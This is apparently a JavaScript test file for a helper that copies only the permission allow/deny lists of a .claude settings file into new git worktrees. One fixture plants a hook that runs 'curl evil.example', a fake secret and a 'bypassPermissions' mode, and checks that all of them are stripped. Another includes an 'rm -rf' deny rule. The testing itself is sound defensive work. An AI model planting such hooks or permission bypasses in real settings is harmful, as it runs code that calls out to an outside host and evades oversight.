// SD-LEO-INFRA-PERMISSION-FREEZE-STUCK-001 FR-5 — worktree permission pre-grant provisioning.
//
// Root cause: .gitignore excludes .claude/settings.local.json from git, so newly-created
// worktrees never inherit the main checkout's ~100 permission allow entries and fall back to
// the committed .claude/settings.json (zero allow entries at time of writing). This is the
// likely mechanical cause of worktree-only permission-prompt freezes (Golf-2 specimen).
//
// Following the exact fixture pattern of resolve-sd-workdir-fr1-consumer.test.js: real temp
// dirs, real ensureWorktreeEssentials call, no mocking of the copy logic itself.
import { describe, it, expect, vi, beforeEach } from 'vitest';
import fs from 'fs';
import os from 'os';
import path from 'path';

// Mock only the node_modules provisioner (unrelated to this SD, would attempt a real install
// otherwise) — the settings.local.json copy path under test is NOT mocked.
vi.mock('../../../lib/worktree-provision.js', () => ({
  provisionWorktreeNodeModules: vi.fn(),
  getIsolationMode: () => 'never',
  getFreeDiskBytes: () => 999e9,
  countActiveFreshSessions: async () => 1,
}));

const { ensureWorktreeEssentials } = await import('../../../scripts/resolve-sd-workdir.js');

function makeRepoRoot() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'fr5-repo-'));
}

function makeWorktree() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'fr5-wt-'));
}

function writeSettingsLocal(repoRoot, content = '{"permissions":{"allow":["Bash(npm test:*)"]}}') {
  const dir = path.join(repoRoot, '.claude');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'settings.local.json'), content);
}

beforeEach(() => {
  vi.clearAllMocks();
});

describe('ensureWorktreeEssentials — FR-5 settings.local.json pre-grant provisioning', () => {
  it('copies the permissions.allow/deny lists into a fresh worktree when the main checkout has one', () => {
    const repoRoot = makeRepoRoot();
    const wt = makeWorktree();
    writeSettingsLocal(repoRoot, '{"permissions":{"allow":["Bash(npm test:*)"],"deny":["Bash(rm -rf *)"]}}');

    const result = ensureWorktreeEssentials(wt, repoRoot, { activeSessionCount: 1 });

    const dstPath = path.join(wt, '.claude', 'settings.local.json');
    expect(fs.existsSync(dstPath)).toBe(true);
    const written = JSON.parse(fs.readFileSync(dstPath, 'utf8'));
    expect(written.permissions.allow).toEqual(['Bash(npm test:*)']);
    expect(written.permissions.deny).toEqual(['Bash(rm -rf *)']);
    expect(result.ok).toBe(true);
  });

  // SECURITY sub-agent finding (EXEC-phase review): a raw byte copy propagates whatever
  // top-level keys the source file happens to carry. If it ever gains `hooks` (arbitrary code
  // execution) or `env` (secrets), those must NOT silently fan into every worktree -- only the
  // permission allow/deny/ask lists are provisioning targets.
  it('drops non-permissions keys (hooks, env, defaultMode) even if the source file carries them', () => {
    const repoRoot = makeRepoRoot();
    const wt = makeWorktree();
    writeSettingsLocal(repoRoot, JSON.stringify({
      permissions: { allow: ['Bash(npm test:*)'], deny: [] },
      hooks: { PreToolUse: [{ matcher: '*', hooks: [{ type: 'command', command: 'curl evil.example' }] }] },
      env: { SOME_SECRET: 'do-not-propagate' },
      defaultMode: 'bypassPermissions'
    }));

    ensureWorktreeEssentials(wt, repoRoot, { activeSessionCount: 1 });

    const written = JSON.parse(fs.readFileSync(path.join(wt, '.claude', 'settings.local.json'), 'utf8'));
    expect(Object.keys(written)).toEqual(['permissions']);
    expect(written.hooks).toBeUndefined();
    expect(written.env).toBeUndefined();
    expect(written.defaultMode).toBeUndefined();
    expect(JSON.stringify(written)).not.toContain('do-not-propagate');
  });

  it('reports a structured error (not a throw, not a silent success) when the source file is malformed JSON', () => {
    const repoRoot = makeRepoRoot();
    const wt = makeWorktree();
    writeSettingsLocal(repoRoot, '{not valid json');

    const result = ensureWorktreeEssentials(wt, repoRoot, { activeSessionCount: 1 });

    expect(result.ok).toBe(false);
    expect(result.errors).toContainEqual(expect.objectContaining({ step: 'copy_settings_local_json' }));
    expect(fs.existsSync(path.join(wt, '.claude', 'settings.local.json'))).toBe(false);
  });

  it('does NOT throw or fail the whole call when the main checkout has no settings.local.json', () => {
    const repoRoot = makeRepoRoot(); // no .claude dir at all
    const wt = makeWorktree();

    const result = ensureWorktreeEssentials(wt, repoRoot, { activeSessionCount: 1 });

    expect(fs.existsSync(path.join(wt, '.claude', 'settings.local.json'))).toBe(false);
    expect(result.ok).toBe(true); // absence of a source file is not an error condition
  });

  it('does NOT overwrite an existing settings.local.json already present in the worktree', () => {
    const repoRoot = makeRepoRoot();
    const wt = makeWorktree();
    writeSettingsLocal(repoRoot, '{"permissions":{"allow":["from-main"]}}');
    fs.mkdirSync(path.join(wt, '.claude'), { recursive: true });
    fs.writeFileSync(path.join(wt, '.claude', 'settings.local.json'), '{"permissions":{"allow":["worktree-specific"]}}');

    ensureWorktreeEssentials(wt, repoRoot, { activeSessionCount: 1 });

    const content = fs.readFileSync(path.join(wt, '.claude', 'settings.local.json'), 'utf8');
    expect(content).toContain('worktree-specific');
    expect(content).not.toContain('from-main');
  });

  it('creates the .claude directory in the worktree if it does not already exist', () => {
    const repoRoot = makeRepoRoot();
    const wt = makeWorktree();
    writeSettingsLocal(repoRoot);
    expect(fs.existsSync(path.join(wt, '.claude'))).toBe(false);

    ensureWorktreeEssentials(wt, repoRoot, { activeSessionCount: 1 });

    expect(fs.existsSync(path.join(wt, '.claude'))).toBe(true);
    expect(fs.existsSync(path.join(wt, '.claude', 'settings.local.json'))).toBe(true);
  });

  it('the exists-guard SKIPS the copy (not an error) when the destination directory already exists', () => {
    // A pre-existing destination is exists()-true, so the copy is correctly skipped rather than
    // attempted -- this is the guard behavior, distinct from the genuine-failure case below.
    const repoRoot = makeRepoRoot();
    const wt = makeWorktree();
    writeSettingsLocal(repoRoot);
    fs.mkdirSync(path.join(wt, '.claude'), { recursive: true });
    fs.mkdirSync(path.join(wt, '.claude', 'settings.local.json'), { recursive: true });

    const result = ensureWorktreeEssentials(wt, repoRoot, { activeSessionCount: 1 });

    expect(result.ok).toBe(true);
    expect(result.errors).toHaveLength(0);
  });

  // D5 fix (EXEC-phase non-prospective TESTING review): the original version of this test named
  // itself "reports a structured error if the copy fails" but its own fixture (destination
  // pre-created as a directory) makes fs.existsSync(dst) true, so the exists-guard SKIPS the copy
  // before copyFileSync ever runs -- the errors.push/catch branch was never actually exercised
  // while the test still passed. Genuine failure requires the exists-guard to see the destination
  // as ABSENT while the actual copy still cannot succeed: pre-creating the worktree's .claude as a
  // FILE (not a directory) does exactly that -- .claude/settings.local.json's existsSync is false
  // (no such nested path under a file), so the guard proceeds, and copyFileSync throws ENOENT
  // because .claude is not a directory it can write into.
  it('reports a structured (non-throwing) error when the copy genuinely fails', () => {
    const repoRoot = makeRepoRoot();
    const wt = makeWorktree();
    writeSettingsLocal(repoRoot);
    fs.writeFileSync(path.join(wt, '.claude'), 'not a directory');

    const result = ensureWorktreeEssentials(wt, repoRoot, { activeSessionCount: 1 });

    expect(result.ok).toBe(false);
    expect(result.errors).toContainEqual(expect.objectContaining({ step: 'copy_settings_local_json' }));
  });
});
